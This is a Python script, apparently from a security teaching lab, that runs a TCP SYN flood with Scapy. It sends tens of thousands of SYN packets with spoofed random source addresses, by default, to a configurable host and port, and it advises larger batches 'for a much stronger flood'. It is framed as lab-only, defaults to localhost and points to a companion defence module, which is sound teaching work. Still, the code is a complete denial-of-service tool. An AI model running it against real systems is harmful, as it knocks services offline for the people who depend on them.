#!/usr/bin/env python3
"""
TCP SYN flood helper 

"""

from __future__ import annotations

import argparse
import random
import sys
import time
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

if __name__ == "__main__" and len(sys.argv) == 2 and sys.argv[1] in ("--version", "-V"):
    print(
        "syn_flood 4 — default: RandIP spoof; use: sudo $(which python) -m attacks.syn_flood "
        "(optional --host/--port; --no-spoof for single src)"
    )
    raise SystemExit(0)

from scapy.all import IP, RandIP, TCP, send


def _one_syn(host: str, port: int, spoof: bool) -> object:
    tcp = TCP(dport=port, flags="S", seq=random.randint(0, 2**32 - 1))
    if spoof:
        return IP(src=RandIP(), dst=host) / tcp
    # Real source — lets per-IP firewall limits and SYN-RECV backlog behave predictably
    return IP(dst=host) / tcp


def run_syn_flood(
    host: str,
    port: int,
    count: int,
    iface: str | None,
    batch: int,
    inter: float,
    spoof: bool,
) -> None:
    kwargs = {"verbose": 0}
    if iface:
        kwargs["iface"] = iface

    sent = 0
    # Progress lines (not too chatty on huge counts)
    report_every = max(1, min(500, max(1, count // 20)))
    while sent < count:
        n = min(batch, count - sent)
        try:
            if n == 1:
                send(_one_syn(host, port, spoof), **kwargs)
            else:
                pkts = [_one_syn(host, port, spoof) for _ in range(n)]
                send(pkts, **kwargs)
        except PermissionError:
            print(
                "\nScapy needs a raw IP socket on Linux (CAP_NET_RAW). Run the same command with sudo, "
                "using this environment's Python, e.g. from the repo root after `conda activate snp_lab`:\n"
                '  sudo "$(which python)" -m attacks.syn_flood '
                f"--count {count} --batch {batch}"
                + (f" --host {host} --port {port}" if (host, port) != ("127.0.0.1", 8000) else "")
                + (f" --inter {inter}" if inter else "")
                + (" --no-spoof" if not spoof else "")
                + (f" --iface {iface}" if iface else "")
                + "\n",
                flush=True,
            )
            raise SystemExit(1) from None
        sent += n
        if inter > 0:
            time.sleep(inter)
        if sent % report_every == 0 or sent == count:
            mode = "spoofed src" if spoof else "real src (no spoof)"
            print(f"sent {sent}/{count} SYN packets ({mode}, batch={batch})...", flush=True)

    mode = "spoofed RandIP" if spoof else "real source IP"
    print(
        f"SYN flood complete: sent {sent} SYN packets toward {host}:{port} "
        f"({mode}, batch={batch}, inter={inter})"
    )


def main() -> None:
    p = argparse.ArgumentParser(
        description=(
            "TCP SYN packet generator (lab-only). Defaults: 127.0.0.1:8000, RandIP spoofed src "
            "(Wireshark shows many sources). Use --no-spoof for single-source loopback demos. "
            "Linux: sudo + raw socket."
        ),
        epilog=(
            "Preferred (always loads THIS repo): "
            'sudo "$(which python)" -m attacks.syn_flood\n'
            "Alternate: sudo \"$(which python)\" attacks/syn_flood.py\n"
            "If argparse still requires --host/--port, you are not running this file (wrong path / old copy)."
        ),
    )
    p.add_argument(
        "--host",
        default="127.0.0.1",
        help="Target host/IP (default: 127.0.0.1)",
    )
    p.add_argument(
        "--port",
        type=int,
        default=8000,
        help="Target TCP port (default: 8000)",
    )
    p.add_argument(
        "--count",
        type=int,
        default=20000,
        help="How many SYN packets to send (default: 20000)",
    )
    p.add_argument(
        "--batch",
        type=int,
        default=200,
        help="Packets per Scapy send() call (default: 200; increase for heavier load)",
    )
    p.add_argument(
        "--inter",
        type=float,
        default=0.0,
        help="Seconds to sleep after each batch (default: 0 = max rate for your setup)",
    )
    p.add_argument(
        "--iface",
        default=None,
        help="Optional scapy interface name (e.g. eth0). If omitted, scapy chooses.",
    )
    p.add_argument(
        "--no-spoof",
        action="store_true",
        help="Use real source IP (127.0.0.1↔127.0.0.1 on loopback). Default is RandIP spoofing.",
    )
    args = p.parse_args()
    if args.batch < 1:
        p.error("--batch must be >= 1")

    spoof = not args.no_spoof
    print(
        f"Starting SYN send: {args.host}:{args.port} count={args.count} batch={args.batch} "
        f"inter={args.inter}s spoof={spoof}",
        flush=True,
    )
    if args.batch < 50:
        print(
            "Tip: batch is low; use --batch 200 (or 500) for a much stronger flood.",
            flush=True,
        )
    print(
        "Note: Raw SYNs are not HTTP — uvicorn will not print access lines or appointment logs. "
        "Watch defence: sudo $(which python) -m defence.syn_defence asa-counters   and/or   "
        "python -m defence.syn_defence half-open   and/or   sudo tcpdump -ni lo tcp port "
        f"{args.port}",
        flush=True,
    )
    if not spoof:
        print(
            "Wireshark: single source (--no-spoof); use default (spoofed) to see many random src IPs.",
            flush=True,
        )
    run_syn_flood(args.host, args.port, args.count, args.iface, args.batch, args.inter, spoof)


if __name__ == "__main__":
    main()
